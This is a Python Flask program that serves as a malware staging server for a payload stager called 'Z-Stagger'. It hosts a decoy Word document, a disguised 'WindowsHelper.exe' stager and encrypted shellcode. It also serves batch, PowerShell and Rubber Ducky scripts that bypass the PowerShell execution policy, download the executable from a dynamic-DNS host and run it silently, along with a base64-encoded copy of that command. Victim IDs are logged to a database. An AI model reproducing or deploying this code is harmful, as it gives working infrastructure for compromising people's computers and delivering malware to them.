from flask import Flask, send_file, request, g
from flask import make_response, render_template
import base64, time
import os
import sqlite3
import logging



app = Flask(__name__)
base_path = '.'  # Change this to the path of your files directory

# Set up logging
logging.basicConfig(filename='logs.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
# Set Flask debug mode to False
app.debug = True

def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect('requests.db')
    return g.db

@app.teardown_appcontext
def close_db(error):
    if hasattr(g, 'db'):
        g.db.close()


@app.route('/')
def index():
    base_dir = os.path.abspath(os.path.dirname(__file__))
    template_dir = os.path.join(base_dir, 'templates')
    return render_template(os.path.join(template_dir, 'index.html'))


@app.route('/docx')
def download_docx():
	print("Document being downloaded by " + request.remote_addr)
	return send_file('In-house_automated_system.docx', as_attachment=True)

@app.route('/kneel')
def download_stager():
        filename = "WindowsHelper.exe"
        print(f" [!] Client downloading {request.remote_addr}")
        return send_file(filename, as_attachment=True)

@app.route('/seed_psh')
def download_pshseed():
	code = '''Invoke-WebRequest -Uri "http://aui.hopto.org/kneel" -OutFile "WindowsHelper.exe"; Start-Process "WindowsHelper.exe" -NoNewWindow'''
	return code

@app.route('/seed')
def download_seed():
	#print("[" + str(time.ctime()) + "] Request from " + id + " IP: " + str(request.remote_addr))
	print("Requested for /seed")
	code = '''
@echo off
powershell -Command "Invoke-WebRequest -Uri "http://aui.hopto.org/kneel" -OutFile "WindowsHelper.exe"; Start-Process "WindowsHelper.exe" -NoNewWindow"
'''
	#print(code)
	response = make_response(code)
	response.headers.set('Content-Type', 'text/plain')
	response.headers.set('Content-Disposition', 'attachment', filename='run.bat')
	return response

@app.route('/ducky')
def return_pshscript():
	#code = '''powershell -Command "Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL2F1aS5ob3B0by5vcmcva25lZWwiIC1PdXRGaWxlICJXaW5kb3dzSGVscGVyLmV4ZSI7IFN0YXJ0LVByb2Nlc3MgIldpbmRvd3NIZWxwZXIuZXhlIiAtTm9OZXdXaW5kb3cK')))"'''
	code = '''<html></body>
GUI r <br>
STRING cmd.exe <br>
ENTER <br>
delay 500 <br>
STRING powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri 'http://aui.hopto.org/seed_psh' -UseBasicParsing).Content";exit


</body>
</html>
'''
	return code



@app.route('/images')
def download_shellcode():
    filename = "encrypted_shellcode.bin"
    id = base64.b64decode(request.args.get('id')).decode('ascii')
    #print(id)
    #//print(type(id))
    logging.info(f"Request from: {id}")
    print("[" + str(time.ctime()) + "] Request from " + id + " IP: " + request.remote_addr)

    a = input("Transfer files(y/n):")
    if a != 'y':
        try:
            db = get_db()
            c = db.cursor()
            c.execute('INSERT INTO requests (client_id, timestamp) VALUES (?, datetime("now"))', (id,))
            db.commit()
        except:
            pass
        logging.info(f"Denied access: {filename}")
        return f'File not found: {filename}', 404
    file_path = os.path.join(base_path, filename)
    if os.path.exists(file_path):
        try:
            db = get_db()
            c = db.cursor()
            c.execute('INSERT INTO requests (client_id, timestamp) VALUES (?, datetime("now"))', (id,))
            db.commit()

            c.execute('SELECT id FROM requests WHERE client_id = ? ORDER BY timestamp DESC LIMIT 1', (id,))
            request_id = c.fetchone()[0]

            c.execute('INSERT INTO responses (request_id, filename, timestamp) VALUES (?, ?, datetime("now"))', (request_id, filename))
            db.commit()
        except:
            pass

        logging.info(f"File sent: {filename}")
        return send_file(file_path, as_attachment=True)
    else:
        try:
            db = get_db()
            c = db.cursor()
            c.execute('INSERT INTO requests (client_id, timestamp) VALUES (?, datetime("now"))', (id,))
            db.commit()
        except:
            pass
        logging.info(f"File not found: {filename}")
        return f'File not found: {filename}', 404

if __name__ == '__main__':
    if os.name == 'nt':
        cls
    else:
        os.system('clear')
    print("""
███████       ███████ ████████  █████   ██████   ██████  ███████ ██████  
   ███        ██         ██    ██   ██ ██       ██       ██      ██   ██ 
  ███   █████ ███████    ██    ███████ ██   ███ ██   ███ █████   ██████  
 ███               ██    ██    ██   ██ ██    ██ ██    ██ ██      ██   ██ 
███████       ███████    ██    ██   ██  ██████   ██████  ███████ ██   ██
 
     Access: %s to download the payload 
      """ % "http://aui.hopto.org/kneel")
    app.run(host='0.0.0.0', port=80)

